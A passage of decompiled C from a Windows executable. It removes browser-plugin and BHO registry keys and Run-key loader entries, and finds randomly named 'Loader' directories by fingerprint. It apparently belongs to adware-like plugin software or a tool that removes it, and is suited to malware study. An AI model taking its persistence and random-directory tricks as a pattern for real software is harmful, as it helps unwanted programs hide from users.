  FUN_0041546e((char *)(unaff_EBP + -0x51c),(byte *)s_Software__s_00406890);
  bVar1 = FUN_00412065((void *)(unaff_EBP + -0x14),(HKEY)0x80000002,(LPCSTR)(unaff_EBP + -0x51c));
  if (CONCAT31(extraout_var,bVar1) != 0) {
    FUN_0041546e((char *)(unaff_EBP + -0x11c),(byte *)s_Attempting_to_delete_the__s_key__004075c8);
    FUN_004116e9(*(int *)(unaff_EBP + 8),extraout_DL,s_Uninstall_00407528,
                 s_Remove_Plugin_Registry_Root_Key_004075a8,unaff_EBP + -0x11c);
    FUN_0041546e((char *)(unaff_EBP + -0x91c),(byte *)s__s__s_0040460c);
    FUN_004123b0((void *)(unaff_EBP + -0x14),(HKEY)0x80000002,(LPCSTR)(unaff_EBP + -0x51c),
                 s_promo_00406334,(LPBYTE)(unaff_EBP + -0x1c));
    FUN_004123b0((void *)(unaff_EBP + -0x14),(HKEY)0x80000002,(LPCSTR)(unaff_EBP + -0x91c),
                 s_version_004045b8,(LPBYTE)(unaff_EBP + -0x18));
    FUN_004128cf(*(int *)(unaff_EBP + 8),(HKEY)0x80000002,(LPCSTR)(unaff_EBP + -0x51c));
  }
  FUN_00412722((void *)(unaff_EBP + -0x14),(HKEY)0x80000002,
               s_SOFTWARE_Microsoft_Windows_Curre_0040564c,s_CLRSCHLoader_00407590);
  FUN_00412722((void *)(unaff_EBP + -0x14),(HKEY)0x80000002,
               s_SOFTWARE_Microsoft_Windows_Curre_0040564c,s_CntrcLoader_00407584);
  FUN_00412722((void *)(unaff_EBP + -0x14),(HKEY)0x80000002,
               s_SOFTWARE_Microsoft_Windows_Curre_0040564c,s_CSLDR_0040757c);
  FUN_0041546e((char *)(unaff_EBP + -0xd1c),(byte *)s__s_dP_d_00407570);
  FUN_00412722((void *)(unaff_EBP + -0x14),(HKEY)0x80000002,
               s_SOFTWARE_Microsoft_Windows_Curre_0040564c,(LPCSTR)(unaff_EBP + -0xd1c));
  FUN_00412722((void *)(unaff_EBP + -0x14),(HKEY)0x80000002,
               s_SOFTWARE_Microsoft_Windows_Curre_0040564c,*(LPCSTR *)(unaff_EBP + 0xc));
  *(undefined4 *)(unaff_EBP + -4) = 0xffffffff;
  FUN_0041205e((undefined4 *)(unaff_EBP + -0x14));
  *unaff_FS_OFFSET = *(undefined4 *)(unaff_EBP + -0xc);
  return;
}



void FUN_00412f6b(void)

{
  bool bVar1;
  undefined3 extraout_var;
  undefined extraout_DL;
  int unaff_EBP;
  undefined4 *unaff_FS_OFFSET;
  
  FUN_004165b0();
  FUN_00412030((void *)(unaff_EBP + -0x14),*(undefined4 *)(unaff_EBP + 8));
  *(undefined4 *)(unaff_EBP + -4) = 0;
  FUN_0041546e((char *)(unaff_EBP + -0x514),(byte *)s__s__s_0040460c);
  FUN_0041546e((char *)(unaff_EBP + -0x114),(byte *)s_Attempting_to_delete_the_BHO_key_004075fc);
  FUN_004116e9(*(int *)(unaff_EBP + 8),extraout_DL,s_Uninstall_00407528,s_Remove_BHO_Key_004075ec,
               unaff_EBP + -0x114);
  bVar1 = FUN_00412065((void *)(unaff_EBP + -0x14),(HKEY)0x80000002,(LPCSTR)(unaff_EBP + -0x514));
  if (CONCAT31(extraout_var,bVar1) != 0) {
    FUN_0041283a((void *)(unaff_EBP + -0x14),(HKEY)0x80000002,(LPCSTR)(unaff_EBP + -0x514));
  }
  *(undefined4 *)(unaff_EBP + -4) = 0xffffffff;
  FUN_0041205e((undefined4 *)(unaff_EBP + -0x14));
  *unaff_FS_OFFSET = *(undefined4 *)(unaff_EBP + -0xc);
  return;
}



undefined4 FUN_00413016(void)

{
  int *piVar1;
  int iVar2;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined extraout_DL_01;
  int unaff_EBP;
  undefined4 *unaff_FS_OFFSET;
  
  FUN_004165b0();
  iVar2 = *(int *)(unaff_EBP + 8);
  FUN_00412030((void *)(unaff_EBP + -0x14),iVar2);
  *(undefined4 *)(unaff_EBP + -4) = 0;
  FUN_00412ded();
  FUN_00412ded();
  FUN_00412ded();
  FUN_00412ded();
  FUN_00412f6b();
  FUN_00412f6b();
  FUN_00412f6b();
  FUN_00412f6b();
  FUN_00412f6b();
  FUN_00412f6b();
  FUN_00412c8c();
  FUN_00412c8c();
  FUN_00412c8c();
  FUN_00412c8c();
  FUN_00412c8c();
  FUN_00412c8c();
  FUN_0041546e((char *)(unaff_EBP + -0x154),(byte *)s_Attempting_to_delete__d_random_d_0040768c);
  FUN_004116e9(iVar2,extraout_DL,s_Uninstall_00407528,s_Uninstall_Old_Plugin_00407674,
               unaff_EBP + -0x154);
  if (*(int *)(unaff_EBP + 0x14) < 1) {
    FUN_004116e9(iVar2,extraout_DL_00,s_Uninstall_00407528,s_Uninstall_Old_Plugin_00407674,
                 s_No_duplicate_random_directories_t_00407624);
  }
  else {
    FUN_004116e9(iVar2,extraout_DL_00,s_Uninstall_00407528,s_Uninstall_Old_Plugin_00407674,
                 unaff_EBP + -0x154);
    *(undefined4 *)(unaff_EBP + 8) = **(undefined4 **)(unaff_EBP + 0x10);
    if (0 < *(int *)(unaff_EBP + 0x14)) {
      *(int *)(unaff_EBP + 0x14) = *(int *)(unaff_EBP + 0x14);
      do {
        FUN_0041546e((char *)(unaff_EBP + -0x154),
                     (byte *)s_Removing_Duplicate_Directory___s_00407650);
        FUN_004116e9(iVar2,extraout_DL_01,s_Uninstall_00407528,s_Uninstall_Old_Plugin_00407674,
                     unaff_EBP + -0x154);
        FUN_00412ded();
        FUN_0041546e((char *)(unaff_EBP + -0x54),(byte *)s__s_DLL_0040491c);
        FUN_00412c8c();
        *(int *)(unaff_EBP + 8) = *(int *)(unaff_EBP + 8) + 0x40;
        piVar1 = (int *)(unaff_EBP + 0x14);
        *piVar1 = *piVar1 + -1;
      } while (*piVar1 != 0);
    }
  }
  *(undefined4 *)(unaff_EBP + -4) = 0xffffffff;
  FUN_0041205e((undefined4 *)(unaff_EBP + -0x14));
  *unaff_FS_OFFSET = *(undefined4 *)(unaff_EBP + -0xc);
  return 0;
}



void __cdecl FUN_004131f9(char *param_1,undefined4 *param_2)

{
  char cVar1;
  char *pcVar2;
  uint uVar3;
  uint uVar4;
  undefined4 *puVar5;
  
  pcVar2 = FUN_00415e60(param_1,'\\');
  if (pcVar2 != (char *)0x0) {
    param_1 = pcVar2 + 1;
  }
  uVar3 = 0xffffffff;
  do {
    pcVar2 = param_1;
    if (uVar3 == 0) break;
    uVar3 = uVar3 - 1;
    pcVar2 = param_1 + 1;
    cVar1 = *param_1;
    param_1 = pcVar2;
  } while (cVar1 != '\0');
  uVar3 = ~uVar3;
  puVar5 = (undefined4 *)(pcVar2 + -uVar3);
  for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {
    *param_2 = *puVar5;
    puVar5 = puVar5 + 1;
    param_2 = param_2 + 1;
  }
  for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {
    *(undefined *)param_2 = *(undefined *)puVar5;
    puVar5 = (undefined4 *)((int)puVar5 + 1);
    param_2 = (undefined4 *)((int)param_2 + 1);
  }
  return;
}



void __cdecl FUN_00413232(char *param_1,undefined4 *param_2)

{
  char cVar1;
  char *pcVar2;
  uint uVar3;
  uint uVar4;
  undefined4 *puVar5;
  char *pcVar6;
  undefined4 *puVar7;
  undefined4 local_404 [256];
  
  uVar3 = 0xffffffff;
  pcVar2 = param_1;
  do {
    pcVar6 = pcVar2;
    if (uVar3 == 0) break;
    uVar3 = uVar3 - 1;
    pcVar6 = pcVar2 + 1;
    cVar1 = *pcVar2;
    pcVar2 = pcVar6;
  } while (cVar1 != '\0');
  uVar3 = ~uVar3;
  puVar5 = (undefined4 *)(pcVar6 + -uVar3);
  puVar7 = local_404;
  for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {
    *puVar7 = *puVar5;
    puVar5 = puVar5 + 1;
    puVar7 = puVar7 + 1;
  }
  for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {
    *(undefined *)puVar7 = *(undefined *)puVar5;
    puVar5 = (undefined4 *)((int)puVar5 + 1);
    puVar7 = (undefined4 *)((int)puVar7 + 1);
  }
  pcVar2 = FUN_00415e60((char *)local_404,'\\');
  if (pcVar2 != (char *)0x0) {
    *pcVar2 = '\0';
  }
  pcVar2 = FUN_00415e60((char *)local_404,'\\');
  if (pcVar2 != (char *)0x0) {
    param_1 = pcVar2 + 1;
  }
  uVar3 = 0xffffffff;
  do {
    pcVar2 = param_1;
    if (uVar3 == 0) break;
    uVar3 = uVar3 - 1;
    pcVar2 = param_1 + 1;
    cVar1 = *param_1;
    param_1 = pcVar2;
  } while (cVar1 != '\0');
  uVar3 = ~uVar3;
  puVar5 = (undefined4 *)(pcVar2 + -uVar3);
  for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {
    *param_2 = *puVar5;
    puVar5 = puVar5 + 1;
    param_2 = param_2 + 1;
  }
  for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {
    *(undefined *)param_2 = *(undefined *)puVar5;
    puVar5 = (undefined4 *)((int)puVar5 + 1);
    param_2 = (undefined4 *)((int)param_2 + 1);
  }
  return;
}



void __cdecl FUN_004132b6(char *param_1,undefined4 *param_2)

{
  char cVar1;
  char *pcVar2;
  uint uVar3;
  uint uVar4;
  undefined4 *puVar5;
  undefined4 *puVar6;
  
  uVar3 = 0xffffffff;
  do {
    pcVar2 = param_1;
    if (uVar3 == 0) break;
    uVar3 = uVar3 - 1;
    pcVar2 = param_1 + 1;
    cVar1 = *param_1;
    param_1 = pcVar2;
  } while (cVar1 != '\0');
  uVar3 = ~uVar3;
  puVar5 = (undefined4 *)(pcVar2 + -uVar3);
  puVar6 = param_2;
  for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {
    *puVar6 = *puVar5;
    puVar5 = puVar5 + 1;
    puVar6 = puVar6 + 1;
  }
  for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {
    *(undefined *)puVar6 = *(undefined *)puVar5;
    puVar5 = (undefined4 *)((int)puVar5 + 1);
    puVar6 = (undefined4 *)((int)puVar6 + 1);
  }
  pcVar2 = FUN_00415e60((char *)param_2,'\\');
  if (pcVar2 != (char *)0x0) {
    *pcVar2 = '\0';
  }
  return;
}



undefined4 __cdecl FUN_004132f2(int param_1,LPCSTR param_2)

{
  int iVar1;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined uVar2;
  undefined extraout_DL_01;
  char *pcVar3;
  uint local_504 [256];
  char local_104 [256];
  
  iVar1 = FUN_00415d42(local_504,(uint *)0x400);
  if (iVar1 == 0) {
    pcVar3 = s_Error_retrieving_the_current_dir_004078d0;
    uVar2 = extraout_DL;
  }
  else {
    iVar1 = FUN_00415cbc(param_2);
    if (iVar1 == 0) {
      FUN_0041546e(local_104,(byte *)s_Successfully_changed_to_the_spec_00407850);
      FUN_004116e9(param_1,extraout_DL_01,&DAT_00407848,s_Directory_Exists_00407888,local_104);
      FUN_00415cbc((LPCSTR)local_504);
      return 1;
    }
    FUN_0041546e(local_104,(byte *)s_Error_changing_to_the_specified_d_0040789c);
    pcVar3 = local_104;
    uVar2 = extraout_DL_00;
  }
  FUN_004116e9(param_1,uVar2,&DAT_00407848,s_Directory_Exists_00407888,pcVar3);
  return 0;
}



bool __cdecl FUN_00413399(int param_1,LPCSTR param_2)

{
  int *piVar1;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined uVar2;
  char local_104 [256];
  
  piVar1 = (int *)FUN_004154e0(param_2,&DAT_00405ab8);
  if (piVar1 != (int *)0x0) {
    FUN_004150d8(piVar1);
    FUN_0041546e(local_104,(byte *)s_file___s__found__00407908);
    uVar2 = extraout_DL_00;
  }
  else {
    FUN_0041546e(local_104,(byte *)s_file___s__not_found__0040791c);
    uVar2 = extraout_DL;
  }
  FUN_004116e9(param_1,uVar2,&DAT_00407848,s_File_Exists_004078fc,local_104);
  return piVar1 != (int *)0x0;
}



int __cdecl FUN_0041340f(int param_1,byte *param_2)

{
  byte bVar1;
  byte *pbVar2;
  int iVar3;
  int iVar4;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined uVar5;
  byte *pbVar6;
  bool bVar7;
  char *pcVar8;
  char local_108 [256];
  int local_8;
  
  local_8 = 0;
  pbVar6 = &DAT_004079dc;
  iVar4 = 2;
  pbVar2 = param_2;
  do {
    bVar1 = *pbVar2;
    bVar7 = bVar1 < *pbVar6;
    if (bVar1 != *pbVar6) {
LAB_0041344e:
      iVar3 = (1 - (uint)bVar7) - (uint)(bVar7 != 0);
      goto LAB_00413453;
    }
    if (bVar1 == 0) break;
    bVar1 = pbVar2[1];
    bVar7 = bVar1 < pbVar6[1];
    if (bVar1 != pbVar6[1]) goto LAB_0041344e;
    pbVar2 = pbVar2 + 2;
    pbVar6 = pbVar6 + 2;
  } while (bVar1 != 0);
  iVar3 = 0;
LAB_00413453:
  if (iVar3 == 0) {
    iVar4 = 1;
  }
  else {
    pbVar6 = &DAT_004079d8;
    pbVar2 = param_2;
    do {
      bVar1 = *pbVar2;
      bVar7 = bVar1 < *pbVar6;
      if (bVar1 != *pbVar6) {
LAB_00413488:
        iVar3 = (1 - (uint)bVar7) - (uint)(bVar7 != 0);
        goto LAB_0041348d;
      }
      if (bVar1 == 0) break;
      bVar1 = pbVar2[1];
      bVar7 = bVar1 < pbVar6[1];
      if (bVar1 != pbVar6[1]) goto LAB_00413488;
      pbVar2 = pbVar2 + 2;
      pbVar6 = pbVar6 + 2;
    } while (bVar1 != 0);
    iVar3 = 0;
LAB_0041348d:
    if (iVar3 != 0) {
      iVar4 = FUN_00415cb1((LPCSTR)param_2);
      if (iVar4 == 0) {
        FUN_0041546e(local_108,(byte *)s_File___s__removed__004079c4);
        uVar5 = extraout_DL;
        iVar4 = local_8;
      }
      else {
        if (DAT_00425194 == 0xd) {
          pcVar8 = s_File___s__NOT_removed__insuffici_0040798c;
        }
        else if (DAT_00425194 == 2) {
          pcVar8 = s_File___s__NOT_removed__not_found_00407968;
        }
        else {
          pcVar8 = s_File___s__NOT_removed__unknown_e_00407940;
        }
        FUN_0041546e(local_108,(byte *)pcVar8);
        uVar5 = extraout_DL_00;
        iVar4 = DAT_00425194;
      }
      FUN_004116e9(param_1,uVar5,&DAT_00407848,s_Remove_File_00407934,local_108);
    }
  }
  return iVar4;
}



DWORD __cdecl FUN_00413512(int param_1,LPCSTR param_2,LPCSTR param_3)

{
  bool bVar1;
  int iVar2;
  DWORD DVar3;
  HANDLE hFindFile;
  BOOL BVar4;
  DWORD DVar5;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined extraout_DL_01;
  undefined extraout_DL_02;
  undefined uVar6;
  undefined extraout_DL_03;
  uint local_644 [256];
  _WIN32_FIND_DATAA local_244;
  char local_104 [256];
  
  iVar2 = FUN_00415d42(local_644,(uint *)0x400);
  if (iVar2 == 0) {
    FUN_004116e9(param_1,extraout_DL,&DAT_00407848,s_Remove_Files_00407a54,
                 s_Error_retrieving_the_current_dir_004078d0);
    DVar3 = 0xffffffff;
  }
  else {
    iVar2 = FUN_00415cbc(param_2);
    if (iVar2 == 0) {
      hFindFile = FindFirstFileA(param_3,&local_244);
      if (hFindFile == (HANDLE)0xffffffff) {
        DVar3 = GetLastError();
        if (DVar3 == 2) {
          DVar3 = 0;
          FUN_0041546e(local_104,(byte *)s___s__NOT_found_in___s___00407a08);
          uVar6 = extraout_DL_01;
        }
        else {
          FUN_0041546e(local_104,(byte *)s_Error__d_searching_for___s__in___004079e0);
          uVar6 = extraout_DL_02;
        }
        FUN_004116e9(param_1,uVar6,&DAT_00407848,s_Remove_Files_00407a54,local_104);
      }
      else {
        bVar1 = false;
        do {
          DVar3 = FUN_0041340f(param_1,(byte *)local_244.cFileName);
          BVar4 = FindNextFileA(hFindFile,&local_244);
          if (BVar4 == 0) {
            DVar5 = GetLastError();
            if (DVar5 != 0x12) {
              FUN_0041546e(local_104,(byte *)s_Error__d_searching_for___s__in___004079e0);
              FUN_004116e9(param_1,extraout_DL_03,&DAT_00407848,s_Remove_Files_00407a54,local_104);
            }
            bVar1 = true;
          }
        } while (!bVar1);
        FindClose(hFindFile);
      }
      FUN_00415cbc((LPCSTR)local_644);
    }
    else {
      FUN_0041546e(local_104,(byte *)s_Error_changing_the_working_direc_00407a24);
      FUN_004116e9(param_1,extraout_DL_00,&DAT_00407848,s_Remove_Files_00407a54,local_104);
      DVar3 = 0xfffffffe;
    }
  }
  return DVar3;
}



DWORD __cdecl FUN_0041369a(int param_1,LPCSTR param_2,char *param_3,char *param_4,byte *param_5)

{
  int iVar1;
  uint uVar2;
  BOOL BVar3;
  DWORD DVar4;
  void *extraout_ECX;
  void *extraout_ECX_00;
  void *extraout_ECX_01;
  void *extraout_ECX_02;
  void *this;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined extraout_DL_01;
  undefined extraout_DL_02;
  undefined uVar5;
  undefined extraout_DL_03;
  undefined extraout_DL_04;
  undefined extraout_DL_05;
  uint local_650 [256];
  _WIN32_FIND_DATAA local_250;
  char local_110 [256];
  HANDLE local_10;
  int local_c;
  DWORD local_8;
  
  local_8 = 0;
  iVar1 = FUN_00415d42(local_650,(uint *)0x400);
  if (iVar1 == 0) {
    FUN_004116e9(param_1,extraout_DL,&DAT_00407848,s_Scan_For_Fingerprint_In_Director_00407ad4,
                 s_Error_retrieving_the_current_dir_004078d0);
    local_8 = 0xffffffff;
  }
  else {
    iVar1 = FUN_00415cbc(param_2);
    if (iVar1 == 0) {
      local_10 = FindFirstFileA(&DAT_0040658c,&local_250);
      if (local_10 == (HANDLE)0xffffffff) {
        local_8 = GetLastError();
        if (local_8 == 2) {
          local_8 = 0;
          FUN_0041546e(local_110,(byte *)s___s__NOT_found_in___s___00407a08);
          uVar5 = extraout_DL_01;
        }
        else {
          FUN_0041546e(local_110,(byte *)s_Error__d_searching_for___s__in___004079e0);
          uVar5 = extraout_DL_02;
        }
        FUN_004116e9(param_1,uVar5,&DAT_00407848,s_Scan_For_Fingerprint_In_Director_00407ad4,
                     local_110);
      }
      else {
        local_c = 0;
        this = extraout_ECX;
        do {
          uVar2 = FUN_0041dd90(this,param_5,(byte *)local_250.cFileName);
          if (uVar2 == 0) {
            FUN_0041546e(local_110,(byte *)s_Found_the_Loader_that_has_not_be_00407a64);
            FUN_004116e9(param_1,extraout_DL_04,&DAT_00407848,
                         s_Scan_For_Fingerprint_In_Director_00407ad4,local_110);
          }
          else {
            iVar1 = FUN_0041497a(param_1,local_250.cFileName,param_3);
            if (0 < iVar1) {
              FUN_0041546e(local_110,(byte *)s_File_found__Currently_named_as___00407aac);
              FUN_004116e9(param_1,extraout_DL_03,&DAT_00407848,
                           s_Scan_For_Fingerprint_In_Director_00407ad4,local_110);
              FUN_0041546e(param_4,(byte *)s__s__s_0040460c);
              local_8 = 1;
              local_c = 1;
            }
          }
          BVar3 = FindNextFileA(local_10,&local_250);
          this = extraout_ECX_00;
          if (BVar3 == 0) {
            DVar4 = GetLastError();
            this = extraout_ECX_01;
            if (DVar4 != 0x12) {
              FUN_0041546e(local_110,(byte *)s_Error__d_searching_for___s__in___004079e0);
              FUN_004116e9(param_1,extraout_DL_05,&DAT_00407848,
                           s_Scan_For_Fingerprint_In_Director_00407ad4,local_110);
              this = extraout_ECX_02;
            }
            local_c = 1;
          }
        } while (local_c == 0);
        FindClose(local_10);
      }
      FUN_00415cbc((LPCSTR)local_650);
    }
    else {
      FUN_0041546e(local_110,(byte *)s_Error_changing_the_working_direc_00407a24);
      FUN_004116e9(param_1,extraout_DL_00,&DAT_00407848,s_Scan_For_Fingerprint_In_Director_00407ad4,
                   local_110);
      local_8 = 0xfffffffe;
    }
  }
  return local_8;
}



int __cdecl FUN_004138c6(int param_1,LPCSTR param_2,LPCSTR param_3)

{
  int iVar1;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined uVar2;
  char *pcVar3;
  char local_104 [256];
  
  iVar1 = FUN_004165cf(param_2,param_3);
  if (iVar1 == 0) {
    FUN_0041546e(local_104,(byte *)s_File___s__renamed_to__s__00407b88);
    uVar2 = extraout_DL;
    iVar1 = 0;
  }
  else {
    if (DAT_00425194 == 0xd) {
      pcVar3 = s_File___s__NOT_renamed__insuffici_00407b50;
    }
    else if (DAT_00425194 == 2) {
      pcVar3 = s_File___s__NOT_renamed__not_found_00407b2c;
    }
    else {
      pcVar3 = s_File___s__NOT_renamed__unknown_e_00407b04;
    }
    FUN_0041546e(local_104,(byte *)pcVar3);
    uVar2 = extraout_DL_00;
    iVar1 = DAT_00425194;
  }
  FUN_004116e9(param_1,uVar2,&DAT_00407848,s_Rename_File_00407af8,local_104);
  return iVar1;
}



int __cdecl
FUN_00413957(int param_1,LPCSTR param_2,LPCSTR param_3,byte *param_4,char *param_5,
            undefined4 *param_6)

{
  char cVar1;
  bool bVar2;
  undefined3 extraout_var;
  int iVar3;
  HANDLE hFindFile;
  DWORD DVar4;
  BOOL BVar5;
  undefined4 *puVar6;
  undefined3 extraout_var_00;
  uint uVar7;
  void *this;
  byte *extraout_ECX;
  uint uVar8;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined extraout_DL_01;
  undefined extraout_DL_02;
  undefined uVar9;
  undefined extraout_DL_03;
  undefined extraout_DL_04;
  undefined extraout_DL_05;
  undefined extraout_DL_06;
  undefined extraout_DL_07;
  undefined extraout_DL_08;
  undefined extraout_DL_09;
  undefined extraout_DL_10;
  uint *puVar10;
  CHAR *pCVar11;
  CHAR *pCVar12;
  undefined4 *puVar13;
  char *pcVar14;
  byte *this_00;
  uint local_e50 [256];
  char local_a50 [1024];
  char local_650 [1024];
  _WIN32_FIND_DATAA local_250;
  char local_110 [256];
  HANDLE local_10;
  int local_c;
  int local_8;
  
  local_8 = 0;
  if (*param_4 == 0) {
    FUN_0041546e(local_a50,(byte *)s__s__s__s_exe_00407cc4);
    bVar2 = FUN_00413399(param_1,local_a50);
    if (CONCAT31(extraout_var,bVar2) != 0) {
      FUN_0041546e((char *)param_4,&DAT_00404364);
    }
  }
  iVar3 = FUN_00415d42(local_e50,(uint *)0x400);
  if (iVar3 == 0) {
    FUN_004116e9(param_1,extraout_DL,&DAT_00407848,s_Check_For_Existing_Random_Direct_00407ca0,
                 s_Error_retrieving_the_current_dir_004078d0);
    local_8 = 0;
  }
  else {
    iVar3 = FUN_00415cbc(param_2);
    if (iVar3 == 0) {
      hFindFile = FindFirstFileA(param_3,&local_250);
      if (hFindFile == (HANDLE)0xffffffff) {
        DVar4 = GetLastError();
        if (DVar4 == 2) {
          FUN_0041546e(local_110,(byte *)s___s__NOT_found_in___s___00407a08);
          uVar9 = extraout_DL_01;
        }
        else {
          FUN_0041546e(local_110,(byte *)s_Error__d_searching_for___s__in___004079e0);
          uVar9 = extraout_DL_02;
        }
        FUN_004116e9(param_1,uVar9,&DAT_00407848,s_Check_For_Existing_Random_Direct_00407ca0,
                     local_110);
      }
      else {
        bVar2 = false;
        do {
          iVar3 = -1;
          pCVar11 = local_250.cFileName;
          do {
            if (iVar3 == 0) break;
            iVar3 = iVar3 + -1;
            cVar1 = *pCVar11;
            pCVar11 = pCVar11 + 1;
          } while (cVar1 != '\0');
          if (iVar3 == -10) {
LAB_00413ac4:
            local_8 = local_8 + 1;
          }
          else {
            iVar3 = -1;
            pCVar11 = local_250.cFileName;
            do {
              if (iVar3 == 0) break;
              iVar3 = iVar3 + -1;
              cVar1 = *pCVar11;
              pCVar11 = pCVar11 + 1;
            } while (cVar1 != '\0');
            if (iVar3 == -0xf) goto LAB_00413ac4;
          }
          BVar5 = FindNextFileA(hFindFile,&local_250);
          if (BVar5 == 0) {
            bVar2 = true;
          }
        } while (!bVar2);
        FUN_0041546e(local_110,(byte *)s_Found__d_directories_under__s_00407c80);
        FUN_004116e9(param_1,extraout_DL_03,&DAT_00407848,
                     s_Check_For_Existing_Random_Direct_00407ca0,local_110);
        local_c = 0;
        local_10 = FindFirstFileA(param_3,&local_250);
        puVar10 = (uint *)(local_8 << 6);
        puVar6 = (undefined4 *)FUN_00415216(puVar10);
        *param_6 = puVar6;
        puVar13 = puVar6;
        for (uVar7 = (uint)puVar10 >> 2; uVar7 != 0; uVar7 = uVar7 - 1) {
          *puVar13 = 0;
          puVar13 = puVar13 + 1;
        }
        local_8 = 0;
        for (iVar3 = 0; param_6 = puVar6, iVar3 != 0; iVar3 = iVar3 + -1) {
          *(undefined *)puVar13 = 0;
          puVar13 = (undefined4 *)((int)puVar13 + 1);
        }
        do {
          FUN_0041546e(local_110,(byte *)s_Analyzing__s_00407c70);
          FUN_004116e9(param_1,extraout_DL_04,&DAT_00407848,
                       s_Check_For_Existing_Random_Direct_00407ca0,local_110);
          uVar7 = 0xffffffff;
          pCVar11 = local_250.cFileName;
          do {
            if (uVar7 == 0) break;
            uVar7 = uVar7 - 1;
            cVar1 = *pCVar11;
            pCVar11 = pCVar11 + 1;
          } while (cVar1 != '\0');
          this = (void *)(~uVar7 - 1);
          if (this == (void *)0x8) {
LAB_00413bb2:
            this_00 = param_4;
            uVar7 = FUN_0041dd90(this,(byte *)local_250.cFileName,param_4);
            if (uVar7 == 0) goto LAB_00413d66;
            pCVar11 = local_250.cFileName;
            cVar1 = local_250.cFileName[0];
            while (cVar1 != '\0') {
              uVar7 = FUN_004165fd(this_00,(int)*pCVar11);
              puVar10 = FUN_00415540((uint *)s_abcdefghijklmnopqrstuvwxyz012345_00407820,(char)uVar7
                                    );
              if (puVar10 == (uint *)0x0) {
                pcVar14 = s_Fingerprint_did_not_match___s_00407bc4;
                goto LAB_00413d72;
              }
              pCVar11 = pCVar11 + 1;
              this_00 = extraout_ECX;
              cVar1 = *pCVar11;
            }
            FUN_0041546e(local_110,(byte *)s_Found_Possible_match___s_00407c54);
            FUN_004116e9(param_1,extraout_DL_05,&DAT_00407848,
                         s_Check_For_Existing_Random_Direct_00407ca0,local_110);
            FUN_0041546e(local_650,(byte *)s__s__s__s_exe_00407cc4);
            bVar2 = FUN_00413399(param_1,local_650);
            if ((CONCAT31(extraout_var_00,bVar2) != 0) &&
               (iVar3 = FUN_0041497a(param_1,local_650,param_5), 0 < iVar3)) {
              FUN_0041546e(local_110,(byte *)s_Found_Match___s_00407c40);
              FUN_004116e9(param_1,extraout_DL_06,&DAT_00407848,
                           s_Check_For_Existing_Random_Direct_00407ca0,local_110);
              if (*param_4 == 0) {
                FUN_0041546e((char *)param_4,&DAT_00404364);
              }
              else {
                local_8 = local_8 + 1;
                FUN_0041546e(local_110,(byte *)s_Duplicate_Random_Directory_found_00407c18);
                FUN_004116e9(param_1,extraout_DL_07,&DAT_00407848,
                             s_Check_For_Existing_Random_Direct_00407ca0,local_110);
                uVar7 = 0xffffffff;
                pCVar11 = local_250.cFileName;
                do {
                  pCVar12 = pCVar11;
                  if (uVar7 == 0) break;
                  uVar7 = uVar7 - 1;
                  pCVar12 = pCVar11 + 1;
                  cVar1 = *pCVar11;
                  pCVar11 = pCVar12;
                } while (cVar1 != '\0');
                uVar7 = ~uVar7;
                pCVar11 = pCVar12 + -uVar7;
                puVar13 = param_6;
                for (uVar8 = uVar7 >> 2; uVar8 != 0; uVar8 = uVar8 - 1) {
                  *puVar13 = *(undefined4 *)pCVar11;
                  pCVar11 = pCVar11 + 4;
                  puVar13 = puVar13 + 1;
                }
                for (uVar7 = uVar7 & 3; uVar7 != 0; uVar7 = uVar7 - 1) {
                  *(CHAR *)puVar13 = *pCVar11;
                  pCVar11 = pCVar11 + 1;
                  puVar13 = (undefined4 *)((int)puVar13 + 1);
                }
                FUN_0041546e(local_110,(byte *)s_Copied_directory_name_to_sDuplic_00407be4);
                FUN_004116e9(param_1,extraout_DL_08,&DAT_00407848,
                             s_Check_For_Existing_Random_Direct_00407ca0,local_110);
                param_6 = param_6 + 0x10;
              }
            }
          }
          else {
            uVar7 = 0xffffffff;
            pCVar11 = local_250.cFileName;
            do {
              if (uVar7 == 0) break;
              uVar7 = uVar7 - 1;
              cVar1 = *pCVar11;
              pCVar11 = pCVar11 + 1;
            } while (cVar1 != '\0');
            this = (void *)(~uVar7 - 1);
            if (this == (void *)0xd) goto LAB_00413bb2;
LAB_00413d66:
            pcVar14 = s__s_is_not_a_random_directory__00407ba4;
LAB_00413d72:
            FUN_0041546e(local_110,(byte *)pcVar14);
            FUN_004116e9(param_1,extraout_DL_09,&DAT_00407848,
                         s_Check_For_Existing_Random_Direct_00407ca0,local_110);
          }
          BVar5 = FindNextFileA(local_10,&local_250);
          if (BVar5 == 0) {
            DVar4 = GetLastError();
            if (DVar4 != 0x12) {
              FUN_0041546e(local_110,(byte *)s_Error__d_searching_for___s__in___004079e0);
              FUN_004116e9(param_1,extraout_DL_10,&DAT_00407848,
                           s_Check_For_Existing_Random_Direct_00407ca0,local_110);
            }
            local_c = 1;
          }
        } while (local_c == 0);
        FindClose(local_10);
      }
      FUN_00415cbc((LPCSTR)local_e50);
    }
    else {
      FUN_0041546e(local_110,(byte *)s_Error_changing_the_working_direc_00407a24);
      FUN_004116e9(param_1,extraout_DL_00,&DAT_00407848,s_Check_For_Existing_Random_Direct_00407ca0,
                   local_110);
      local_8 = -2;
    }
  }
  return local_8;
}



int __cdecl FUN_00413e0c(int param_1,LPCSTR param_2)

{
  int iVar1;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined uVar2;
  char *pcVar3;
  char local_104 [256];
  
  iVar1 = FUN_004166c8(param_2);
  if (iVar1 == 0) {
    FUN_0041546e(local_104,(byte *)s_Directory___s__removed__00407da0);
    uVar2 = extraout_DL;
